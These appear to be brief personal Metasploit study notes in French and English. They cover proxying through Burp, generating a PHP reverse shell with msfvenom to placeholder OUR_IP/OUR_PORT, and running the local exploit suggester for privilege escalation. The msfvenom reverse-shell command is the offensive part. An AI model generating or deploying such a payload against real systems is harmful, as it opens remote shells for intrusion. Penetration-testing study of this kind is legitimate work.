> migrate explication
> cheatsheet
> msfvenom script generation explain
> difference between setg and set
> sessions -i <number>

```bash

 # rediriger les requettes vers Burp
 set PROXIES HTTP:127.0.0.1:8080
 set RPORT PORT # ou 80
```

```bash
# utilisation de msfvenom pour generer un reverse shell php
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

```bahsh
# privileg escalation audit and suggestion
use post/multi/recon/local_exploit_suggester
```


